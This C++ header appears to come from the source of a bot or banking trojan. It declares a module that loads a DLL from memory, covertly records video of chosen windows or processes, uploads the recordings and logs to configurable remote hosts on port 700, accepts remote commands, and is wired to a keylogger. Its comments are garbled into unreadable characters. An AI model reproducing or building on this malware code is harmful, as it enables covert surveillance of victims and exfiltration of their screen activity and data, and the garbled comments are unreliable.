#ifndef VideoRecorderH
#define VideoRecorderH
//-----------------------------------------------------------------------------

#include <windows.h>
#include "UniversalKeyLogger.h"
#include "DllLoader.h"
#include "Pipes.h"


// ��������� ��������� ��� �������
#define VIDEOREC_PARAM_SIZE_HOST 50
#define VIDEOREC_PARAM_SIZE_URLS 3000

#define VIDEOREC_PARAM_NAME_HOST1 "VIDEO_REC_HOST1"
#define VIDEOREC_PARAM_NAME_HOST2 "VIDEO_REC_HOST2"
#define VIDEOREC_PARAM_NAME_URLS  "VIDEO_REC_URLS\0"

#define VIDEOREC_PARAM_ENCRYPTED_HOST false
#define VIDEOREC_PARAM_ENCRYPTED_URLS false


// ���� ������� ����� �����
const DWORD VIDEORECORD_DEFAULT_PORT = 700;



static const int VIDEO_FULLSCREEN	= 0x0001; //������������� ������
static const int VIDEO_ALWAYS		= 0x0002; //���������� ������, ���� ���� ���� �� �������


//****************************************************
//  TVideoRecDLL - ����� ��� ������ � �����������
//                 �����������
//****************************************************
class TVideoRecDLL : public TMemoryDLL
{
private:

	// ���������� ���� �������
	//������� ������������ � ������������ ���
	typedef DWORD (WINAPI *TInit)( const char* uid, int flags, const char* ip1, int port1, const char* ip2, int port2 );
	typedef void (WINAPI *TRelease)();

	//������� ������ �����
	typedef VOID (WINAPI *TStartRecHwnd	)( char* uid, char* nameVideo, HWND wnd, int seconds, int flags ) ;
	typedef VOID (WINAPI *TStartRecPid  )( char* uid, char* nameVideo, DWORD pid, int seconds, int flags );
	typedef VOID (WINAPI *TStopRec		)();
	typedef VOID (WINAPI *TResetTimer	)();

	//������� �������� ������
	typedef VOID (WINAPI *TStartSend	)( char* path );
	typedef DWORD (WINAPI *TStartSendAsync )( char* path );
	typedef DWORD (WINAPI *TIsSendedAsync )( DWORD );

	//������� �������� ����� �� ������
	typedef void (WINAPI *TSendLog)( const char* name, int code, const char* text );

	//������ ������ ���������� ������ �������
	typedef DWORD (WINAPI *typeCallbackCmd)( DWORD cmd, char* inData, int lenInData, char* outData, int szOutData, DWORD* lenOutData );
	typedef VOID (WINAPI *TRunCmdExec)(typeCallbackCmd);

	void InitializeApi();
	void LoadFunc(const char* Name, LPVOID &Addr);

public:
	TVideoRecDLL();
	~TVideoRecDLL();

	TInit				Init;
	TRelease			Release;
	TStartRecHwnd		RecordWnd;
	TStartRecPid		RecordProcess;
	TStopRec			RecordStop;
	TResetTimer			ResetTimer;
	TStartSend			SendFiles;
	TStartSendAsync		StartSendAsync;
	TIsSendedAsync		IsSendedAsync;
	TRunCmdExec			RunCmdExec;
	TSendLog			SendLog;

};

namespace VideoProcess
{

//�������������� ����� ��� � �������� ���� ����� ��� ������ ������ �� ����������
bool Start();
//���������� ������ ����� ��������
void Stop();
//���������� ��� ���� ������ ��� ����� ��������
char* GetNamePipe( char* buf );

//������� ����� ����� ����� �������� ������� ����� ���. ����� ��� ������ ���� ��������
//� ������������ ���������� � ��������� ��������
bool RecordHWND( const char* name, HWND wnd, int seconds = 0, int flags = 0 );
bool RecordPID( const char* name, DWORD pid = 0, int seconds = 0, int flags = 0 );
void RecordStop();
DWORD SendFiles( const char* name, const char* path, bool async = false );
bool FilesIsSended(DWORD id);
bool SendLog( const char* name, int code, const char* text );

};

//����� ��� ��������� �������� �����, ��� ������������ ��� ����, ����� �� ������ ��� � ������ �������
class VideoLog : public TBotObject
{
		const char* name;

	public:

		VideoLog( const char* _name ) : name(_name)
		{
		}
		void Send( int code, const char* format, ... );
		void Send2(int code, const char* text )
		{
			Send2( name, code, text );
		}

		//�������� ���� �� ������:
		//name - ��� ����
		//code - ��� ����
		//format - ��������������� ����� ����
		static void Send( const char* name, int code, const char* format, ... );
		static void SendV( const char* name, int code, const char* format, va_list va );
		//���� ����� ��� � Send ������ ��� �������������� ������
		static void Send2( const char* name, int code, const char* text )
		{
			VideoProcess::SendLog( name, code, text );
		}

};

//������� ���������� ����� ������� ��� ������ �����
PCHAR GetVideoRecHost1();
PCHAR GetVideoRecHost2();
//��������� ������� �����, � ���������� ����������� ���� ����� ������� (���� ������� ����� � �������), ���� ������� ����� 
//���������� �������� ����� ������, ��� ������� ��������� �����-��� � ���� �����-��� ���� ����� �����
//��� ��������, ���������� ��������� �� ����������, ����� ������� ����� �������������
//TVideoRecDLL* RunPortForward( const char* ip );
//��������� �����-��� � ��������� �����
bool SaveVideoDll( const char* nameFile );

void StartVideoFromCurrentURL();

#endif
